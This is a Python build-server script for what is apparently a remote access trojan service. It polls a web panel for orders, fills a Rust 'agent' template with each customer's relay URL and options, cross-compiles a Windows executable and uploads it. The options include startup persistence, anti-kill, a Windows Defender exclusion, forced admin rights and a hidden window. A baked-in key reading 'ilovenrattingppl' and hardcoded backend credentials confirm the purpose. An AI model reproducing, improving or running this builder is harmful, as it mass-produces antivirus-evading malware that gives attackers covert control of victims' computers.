#!/usr/bin/env python3
"""
Sentinel Build Server (Rust edition)
=====================================
Polls the Lovable frontend for queued builds, fetches the Rust agent stub,
substitutes placeholders in binding.rs and Cargo.toml, cross-compiles a
Windows .exe via `cargo build --release --target x86_64-pc-windows-gnu`,
and uploads the artifact.

Requirements: Python 3.10+, requests, Rust toolchain with
  `rustup target add x86_64-pc-windows-gnu` and a mingw-w64 linker.
"""

import json, os, sys, time, socket, platform, subprocess, shutil
from pathlib import Path
import re

try:
    import requests
except ImportError:
    print("ERROR: pip install requests"); sys.exit(1)

VERSION = "2.0.0-rust"
ROOT = Path(__file__).parent
CFG = json.loads((ROOT / "config.json").read_text())
KEY        = CFG["buildserver_key"]
FRONTEND   = CFG["frontend_url"].rstrip("/")
POLL_SEC   = CFG.get("poll_seconds", 4)
RUST_TARGET = CFG.get("rust_target", "x86_64-pc-windows-gnu")
HEADERS    = {
    "X-Buildserver-Key": KEY,
    "Content-Type": "application/json",
    "User-Agent": f"sentinel-buildserver/{VERSION}",
}
API        = lambda p: f"{FRONTEND}/api/public/buildserver/{p}"
WORK       = ROOT / "work"; WORK.mkdir(exist_ok=True)

# Supabase / relay constants baked into builds
SUPABASE_URL      = CFG.get("supabase_url", "https://mjgdkyjodvsjxywtdqfu.supabase.co")
SUPABASE_ANON_KEY = CFG.get("supabase_anon_key", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1qZ2RreWpvZHZzanh5d3RkcWZ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODE1MzE3ODksImV4cCI6MjA5NzEwNzc4OX0.JQrgThmhspokUEo4ODhFVOE_oQnqPim-N0961BIrr4Y")
HIDEN_AUTH_KEY     = CFG.get("hiden_auth_key", "ilovenrattingppl")

C_DIM="\033[2m"; C_RED="\033[31m"; C_GRN="\033[32m"; C_YEL="\033[33m"
C_CYA="\033[36m"; C_BLD="\033[1m"; C_RST="\033[0m"

def ts(): return time.strftime("%H:%M:%S")
def log(m, c=""):     print(f"{C_DIM}[{ts()}]{C_RST} {c}{m}{C_RST}", flush=True)
def ok(m):  log(f"✓ {m}", C_GRN)
def err(m): log(f"✗ {m}", C_RED)
def warn(m):log(f"! {m}", C_YEL)
def info(m):log(f"• {m}", C_CYA)

def banner():
    host = socket.gethostname()
    try: ip = socket.gethostbyname(host)
    except Exception: ip = "unknown"
    print(f"""{C_CYA}{C_BLD}
╔══════════════════════════════════════════════════════════════╗
║  SENTINEL BUILDSERVER  v{VERSION:<10}  (rust/{RUST_TARGET})  ║
╠══════════════════════════════════════════════════════════════╣{C_RST}
  {C_DIM}host       :{C_RST} {host} ({ip})
  {C_DIM}os         :{C_RST} {platform.platform()}
  {C_DIM}frontend   :{C_RST} {FRONTEND}
  {C_DIM}key        :{C_RST} {KEY[:14]}…{KEY[-4:]}
  {C_DIM}poll       :{C_RST} every {POLL_SEC}s
{C_CYA}╚══════════════════════════════════════════════════════════════╝{C_RST}
""", flush=True)

def ensure_rust():
    if not shutil.which("cargo"):
        err("cargo not found in PATH — install Rust toolchain"); sys.exit(1)
    v = subprocess.check_output(["rustc", "--version"], text=True).strip()
    ok(v)
    # Ensure target is installed
    subprocess.run(["rustup", "target", "add", RUST_TARGET], capture_output=True)

def poll():
    try:
        r = requests.get(API("poll"), headers=HEADERS, timeout=15)
        if r.status_code == 401:
            err(f"poll → 401 Unauthorized"); return None
        if r.status_code == 204: return None
        if r.status_code == 404:
            err(f"poll → 404 Not Found"); return None
        if not r.ok:
            err(f"poll → HTTP {r.status_code}: {r.text[:200]}"); return None
        j = r.json()
        builds = j.get("builds") or ([j["build"]] if j.get("build") else [])
        return builds[0] if builds else None
    except requests.exceptions.ConnectionError as e:
        err(f"poll connection error: {e}"); return None
    except Exception as e:
        err(f"poll error: {type(e).__name__}: {e}"); return None

def progress(bid, pct, msg="", status="building"):
    try:
        r = requests.post(API("progress"), headers=HEADERS, timeout=10,
            json={"build_id": bid, "progress": pct, "status": status, "message": msg})
        if not r.ok: warn(f"progress {pct}% → HTTP {r.status_code}")
    except Exception as e:
        warn(f"progress error: {e}")

def fetch_stub():
    r = requests.get(API("stub"), headers=HEADERS, timeout=20)
    r.raise_for_status()
    return r.json()["files"]

def render(src: str, ctx: dict) -> str:
    for k, v in ctx.items():
        src = src.replace("{{" + k + "}}", str(v))
    # Fallback: any remaining {{PLACEHOLDER}} → sensible default so a stale
    # build.py never produces uncompilable source.
    def _default(m):
        key = m.group(1)
        if key.startswith("FEATURE_") or key in ("DEBUG", "STARTUP_TASK", "ANTIKILL"):
            return "false"
        return ""
    src = re.sub(r"\{\{([A-Z0-9_]+)\}\}", _default, src)
    return src

def build(b):
    bid  = b["id"]
    name = b.get("name", "agent")
    # Sanitize name for use as Cargo binary name (alphanumeric, hyphens, underscores only)
    safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in name) or "agent"
    info(f"▶ build {bid[:8]}… ({name} → bin:{safe_name}) for user {str(b.get('user_id',''))[:8]}…")
    progress(bid, 5, "fetching stub")

    stub = fetch_stub()
    info(f"  stub files: {', '.join(stub.keys())}")
    feats = b.get("features", {}) or {}
    relay_url = b.get("relay_url", "wss://veltrix.hidenfree.com")
    relay_http = relay_url.replace("wss://", "https://").replace("ws://", "http://")

    ctx = {
        "USER_ID":         b["user_id"],
        "API_BASE":        b.get("target_server_url", FRONTEND),
        "RELAY_URL":       relay_url,
        "RELAY_HTTP_URL":  relay_http,
        "BUILD_NAME":      safe_name,
        "STARTUP_NAME":    b.get("startup_name") or name,
        "DEBUG":           "true" if b.get("debug") else "false",
        "FEATURE_STARTUP": "true" if b.get("startup") else "false",
        "FEATURE_ANTIKILL":"true" if b.get("antikill") else "false",
        "FEATURE_WD_EXCLUSION": "true" if b.get("wd_exclusion") else "false",
        "FEATURE_REQUIRE_ADMIN": "true" if b.get("require_admin") else "false",
        "BUILD_TAG":       (b.get("tag") or ""),
        "SUPABASE_URL":    SUPABASE_URL,
        "SUPABASE_ANON_KEY": SUPABASE_ANON_KEY,
        "HIDEN_AUTH_KEY":  HIDEN_AUTH_KEY,
    }

    bdir = WORK / bid; shutil.rmtree(bdir, ignore_errors=True); bdir.mkdir(parents=True)

    for fname, src in stub.items():
        fpath = bdir / fname
        fpath.parent.mkdir(parents=True, exist_ok=True)
        fpath.write_text(render(src, ctx))

    info(f"  wrote {len(stub)} files to {bdir}")
    progress(bid, 15, "cargo build starting")

    ext = ".exe" if "windows" in RUST_TARGET else ""
    out_name = f"{safe_name}{ext}"

    # Determine cargo flags
    cargo_args = [
        "cargo", "build", "--release",
        "--target", RUST_TARGET,
        "--manifest-path", str(bdir / "Cargo.toml"),
    ]

    # Add windowed feature for non-debug builds on Windows
    if not b.get("debug") and "windows" in RUST_TARGET:
        cargo_args.extend(["--features", "windowed"])

    info(f"  $ {' '.join(cargo_args)}")
    progress(bid, 20, f"compiling for {RUST_TARGET} (this takes a few minutes)")

    env = {**os.environ}
    # Stream cargo output in real-time
    proc = subprocess.Popen(
        cargo_args,
        cwd=bdir, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True,
    )

    output_lines = []
    last_progress_update = time.time()
    for line in proc.stdout:
        line = line.rstrip()
        output_lines.append(line)
        if line.strip():
            # Show compiling progress
            if line.strip().startswith("Compiling"):
                crate_name = line.strip().split(" ")[1] if len(line.strip().split(" ")) > 1 else "?"
                info(f"  compiling: {crate_name}")
                now = time.time()
                if now - last_progress_update > 10:
                    progress(bid, min(75, 20 + len(output_lines) // 5), f"compiling {crate_name}")
                    last_progress_update = now
            elif line.strip().startswith("Finished"):
                info(f"  {line.strip()}")
            elif line.strip().startswith("error"):
                err(f"  {line.strip()}")

    proc.wait()
    if proc.returncode != 0:
        msg = "\n".join(output_lines[-50:])
        err(f"build failed (exit {proc.returncode}):\n{msg}")
        progress(bid, 100, msg[-2000:], status="failed")
        return

    progress(bid, 80, "build complete, locating binary")

    # Find the built binary
    target_dir = bdir / "target" / RUST_TARGET / "release"
    built = target_dir / out_name
    if not built.exists():
        # Try finding any executable in the release dir
        info(f"  binary not at expected path: {built}")
        candidates = []
        if target_dir.exists():
            for candidate in target_dir.iterdir():
                if candidate.is_file() and candidate.stat().st_size > 10000:
                    if ext and candidate.suffix == ext:
                        candidates.append(candidate)
                    elif not ext and candidate.suffix == "" and os.access(str(candidate), os.X_OK):
                        candidates.append(candidate)
            if candidates:
                built = candidates[0]
                info(f"  found binary: {built.name} ({built.stat().st_size // 1024} KB)")

    if not built.exists():
        # List what's in the target dir for debugging
        if target_dir.exists():
            contents = [f.name for f in target_dir.iterdir()]
            err(f"binary not found. target dir contents: {contents}")
        else:
            err(f"target dir does not exist: {target_dir}")
        progress(bid, 100, "binary not found after build", status="failed")
        return

    file_size_kb = built.stat().st_size // 1024
    info(f"  binary: {built.name} ({file_size_kb} KB)")

    # Copy to desired output name
    final_out = bdir / out_name
    if built != final_out:
        shutil.copy2(built, final_out)

    progress(bid, 85, f"uploading ({file_size_kb} KB)")
    try:
        files = {"file": (final_out.name, final_out.read_bytes(), "application/octet-stream")}
        data  = {"build_id": bid}
        up = requests.post(API("upload"),
                           headers={"X-Buildserver-Key": KEY,
                                    "User-Agent": HEADERS["User-Agent"]},
                           files=files, data=data, timeout=300)
        if not up.ok:
            err(f"upload → HTTP {up.status_code}: {up.text[:200]}")
            progress(bid, 100, f"upload failed: {up.status_code}", status="failed")
            return
        dl = (up.json() or {}).get("download_url")
        progress(bid, 100, "done", status="success")
        requests.post(API("progress"), headers=HEADERS, timeout=10,
            json={"build_id": bid, "progress": 100, "status": "success", "download_url": dl})
        ok(f"✓ {bid[:8]}… ({file_size_kb} KB)  →  {dl}")
    except Exception as e:
        err(f"upload exception: {e}")
        progress(bid, 100, str(e), status="failed")

def main():
    banner()
    ensure_rust()
    info(f"connecting → {FRONTEND}/api/public/buildserver/poll")
    # Always fetch a fresh stub on startup so we never run with a stale cache
    try:
        stub = fetch_stub()
        ok(f"fetched fresh stub on startup ({len(stub)} files: {', '.join(stub.keys())})")
    except Exception as e:
        err(f"startup stub fetch failed: {type(e).__name__}: {e}")
    consec_fail = 0
    last_hb = 0
    while True:
        b = poll()
        if b:
            consec_fail = 0
            try: build(b)
            except Exception as e: err(f"build exception: {type(e).__name__}: {e}")
        else:
            consec_fail += 1
            now = time.time()
            if now - last_hb > 30:
                info(f"idle (last_seen heartbeat sent · {consec_fail} polls)")
                last_hb = now
            time.sleep(POLL_SEC)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\nbye"); sys.exit(0)
